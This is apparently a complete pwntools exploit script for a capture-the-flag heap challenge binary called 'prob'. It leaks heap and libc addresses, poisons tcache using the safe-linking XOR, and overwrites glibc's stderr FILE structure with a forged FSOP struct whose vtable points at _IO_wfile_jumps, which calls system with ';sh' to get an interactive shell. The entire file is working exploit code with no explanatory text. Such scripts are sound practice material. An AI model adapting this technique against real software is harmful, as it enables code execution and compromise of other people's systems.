from pwn import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-r', '--remote', action='store_true', help='Connect to remote server')
parser.add_argument('-g', '--gdb', action='store_true', help='Attach GDB debugger')
args = parser.parse_args()

gdb_cmds = [
    #'b *$rebase(0x1507)',
    'c'
]

binary = './prob'
 
context.binary = binary
context.arch = 'amd64'
# context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

if args.remote:
    p = remote("localhost", 20100)
else:
    p = process(binary)
    if args.gdb:
        gdb.attach(p, '\n'.join(gdb_cmds))
l = ELF('./libc.so.6')

def FSOP_struct(flags=0, _IO_read_ptr=0, _IO_read_end=0, _IO_read_base=0,
                _IO_write_base=0, _IO_write_ptr=0, _IO_write_end=0, _IO_buf_base=0, _IO_buf_end=0,
                _IO_save_base=0, _IO_backup_base=0, _IO_save_end=0, _markers=0, _chain=0, _fileno=0,
                _flags2=0, _old_offset=0, _cur_column=0, _vtable_offset=0, _shortbuf=0, lock=0,
                _offset=0, _codecvt=0, _wide_data=0, _freeres_list=0, _freeres_buf=0,
                __pad5=0, _mode=0, _unused2=b"", vtable=0, more_append=b""):
    
    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
    FSOP += p64(__pad5) + p32(_mode)
    if _unused2 == b"":
        FSOP += b"\x00" * 0x14
    else:
        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")
    
    FSOP += p64(vtable)
    FSOP += more_append
    return FSOP

def create(idx : int,  ctt : bytes):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendafter(b': ', ctt)

def read(idx : int):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b': ', str(idx).encode())
    return p.recvline()

def delete(idx : int):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b': ', str(idx).encode())
    
def edit(idx : int,  ctt : bytes):
    p.sendlineafter(b'> ', str(0x1337).encode())
    p.sendlineafter(b': ', str(idx).encode())
    p.sendafter(b': ', ctt)

prefix = b'bot_cake submit food name : '

for i in range(11):
    create(i, b'a' * 0xf0)
for i in range(7):
    create(i, b'cake')
create(7, b'cake')

heap_base = u64(read(0)[:5].ljust(8, b'\x00')) << 12
assert (heap_base >> 44) == 0x5 or (heap_base >> 44) == 0x6 # if the exploit fails here, just restart
print(hex(heap_base))


l.address = u64(read(7)[:6].ljust(8, b'\x00')) - 0x21adf0
assert (l.address >> 44) == 0x7 # if the exploit fails here, just restart
print(hex(l.address))

print(hex(l.sym['_IO_2_1_stderr_']))
fake_fsop_struct = l.sym['_IO_2_1_stderr_']
stderr_lock = l.address + 0x21ca70
FSOP = FSOP_struct(
    flags=u64(b"\x01\x01\x01\x01;sh\x00"),
    lock=stderr_lock,
    _wide_data=fake_fsop_struct - 0x10,
    _markers=l.symbols["system"],
    _unused2=p32(0x0) + p64(0x0) + p64(fake_fsop_struct - 0x8),
    vtable=l.symbols["_IO_wfile_jumps"] - 0x40,
    _mode=0xFFFFFFFF,
)

delete(7)
delete(8)
delete(9)
create(10, b'cake')
create(11, b'a' * 0xf0)
delete(10)
create(12, b'a')
create(13, b'a')
#gdb.attach(p, '\n'.join(gdb_cmds))
create(14, b'a' * (0x28 - len(prefix)) + b'b' * 8 + p64((fake_fsop_struct) ^ (heap_base >> 12)))
for i in range(7, 2, -1):
    delete(14)
    create(14, b'a' * (0x28 - len(prefix)) + b'a' * i)
delete(14)
create(14, b'a' * (0x28 - len(prefix)) + p64(0x121))
create(15, b'a' * 0xf0)
edit(0x110, FSOP)
p.interactive()